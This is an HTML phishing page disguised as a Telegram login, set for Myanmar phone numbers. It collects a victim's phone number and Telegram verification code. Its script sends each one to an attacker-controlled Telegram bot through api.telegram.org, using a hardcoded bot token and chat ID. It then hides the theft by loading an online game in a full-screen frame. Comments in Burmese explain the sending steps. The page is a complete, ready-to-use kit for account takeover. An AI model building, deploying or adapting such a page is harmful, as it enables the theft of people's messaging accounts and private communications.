<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Messenger</title>
    <style>
        body { background-color: #1c2733; color: white; font-family: sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .container { text-align: center; width: 90%; max-width: 350px; }
        h2 { font-size: 20px; margin-bottom: 10px; }
        p { color: #7f91a4; font-size: 14px; margin-bottom: 30px; }
        .input-box { border: 1px solid #3b4754; border-radius: 10px; padding: 15px; display: flex; align-items: center; margin-bottom: 20px; background: transparent; }
        input { background: transparent; border: none; color: white; font-size: 17px; outline: none; width: 100%; }
        .next-btn { background: #3390ec; border: none; width: 55px; height: 55px; border-radius: 50%; color: white; font-size: 24px; cursor: pointer; float: right; margin-top: 20px; }
        #step2, #gameArea { display: none; }
        iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 9999; display: none; }
    </style>
</head>
<body>

<div class="container" id="step1">
    <h2>Your phone number</h2>
    <p>Please confirm your country code and enter your phone number.</p>
    <div class="input-box"><input type="text" value="Myanmar (Burma)" readonly></div>
    <div class="input-box">
        <span style="margin-right: 10px;">+95</span>
        <input type="tel" id="phone" placeholder="9663804708" autocomplete="off">
    </div>
    <button class="next-btn" onclick="goStep2()">→</button>
</div>

<div class="container" id="step2">
    <div style="font-size: 50px; margin-bottom: 20px;">📩</div>
    <h2>Verification Code</h2>
    <p>Check your Telegram app for the code.</p>
    <div class="input-box">
        <input type="number" id="otp" placeholder="Enter 5-digit code" autocomplete="off">
    </div>
    <button class="next-btn" onclick="sendData()">→</button>
</div>

<iframe id="gameFrame" src=""></iframe>

<script>
    const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
    const chat_id = '5304050102';
    const game_url = "https://poki.com/en/g/rail-in-the-air";

    function goStep2() {
        if(document.getElementById('phone').value.length < 7) return;
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        // ပထမအဆင့်မှာတင် ဖုန်းနံပါတ်လှမ်းပို့ထားမယ်
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📱 Number: ${document.getElementById('phone').value}`);
    }

    function sendData() {
        const otp = document.getElementById('otp').value;
        if(otp.length < 5) return;

        // OTP ပို့မယ်
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🔑 OTP: ${otp}`)
        .then(() => {
            // ဂိမ်းကို App ထဲမှာတင်ဖွင့်မယ်
            const frame = document.getElementById('gameFrame');
            frame.src = game_url;
            frame.style.display = 'block';
            document.getElementById('step2').style.display = 'none';
        });
    }
</script>
</body>
</html>
